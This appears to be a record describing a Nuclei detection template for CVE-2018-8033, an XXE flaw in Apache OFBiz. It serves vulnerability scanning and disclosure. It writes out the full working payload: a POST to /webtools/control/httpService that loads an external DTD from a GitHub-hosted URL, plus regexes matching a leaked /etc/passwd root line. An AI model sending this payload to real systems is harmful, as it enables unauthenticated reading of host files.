---
cve_id: CVE-2018-8033
template_path: nuclei-templates/http/cves/2018/CVE-2018-8033.yaml
affected_product: Apache OFBiz
severity: high
authentication: none
external_callback: false
affected_versions: 16.11.01 to 16.11.04
preconditions: []
poc_classification: info-leak
---

## Vulnerability
Apache OFBiz versions 16.11.01 to 16.11.04 suffer from XML External Entity (XXE) Injection in the HTTP service engine (`org.apache.ofbiz.service.engine.HttpEngine.java`) via the `/webtools/control/httpService` endpoint. Both POST and GET requests accept `serviceName`, `serviceMode`, and `serviceContext` parameters; malicious DOCTYPEs in `serviceContext` trigger external entity resolution that returns sensitive host information.

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5). CWE-200.

## PoC / Detection
Classification: info-leak

The template sends one POST request to `/webtools/control/httpService` with form data `serviceName=createPartyGroup&serviceMode=sync&serviceContext=` containing an XML payload with `<!DOCTYPE foo [<!ENTITY %25 request SYSTEM 'https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/xxe-poc.dtd'>%25request;%25secondstage;]><r>%26disclose;</r>`. It detects exploitation on HTTP 200 responses whose body simultaneously matches the regexes `FileNotFoundException:` and `nonexistent\/root:.*:0:0:`.

## References
- https://lists.apache.org/thread/9bym7qk6ccwwr6d3mg26thp9zyv1l06y
- https://nvd.nist.gov/vuln/detail/CVE-2018-8033
